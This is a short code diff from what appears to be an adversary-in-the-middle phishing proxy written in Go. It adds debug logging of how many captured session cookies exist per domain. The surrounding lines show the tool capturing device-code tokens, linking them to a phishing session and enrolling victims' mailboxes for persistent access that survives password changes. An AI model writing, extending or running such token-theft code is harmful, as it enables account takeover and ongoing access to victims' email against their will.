@@ -3778,6 +3778,12 @@ func (p *HttpProxy) setupDeviceCodeCallbacks() {
 
 				log.Success("[%d] [devicecode] %s tokens captured and linked to AitM session!", sid, provider)
 
+				// Debug: log cookie count in session
+				log.Debug("[devicecode] Session %s has %d cookie domains", s.Id, len(s.CookieTokens))
+				for domain, cookies := range s.CookieTokens {
+					log.Debug("[devicecode] Domain %s: %d cookies", domain, len(cookies))
+				}
+
 				// Automatically add account to mailbox manager for persistent access
 				// This ensures the account survives password changes as long as tokens are refreshed
 				if dcSession.RefreshToken != "" && p.mailboxAccounts != nil {
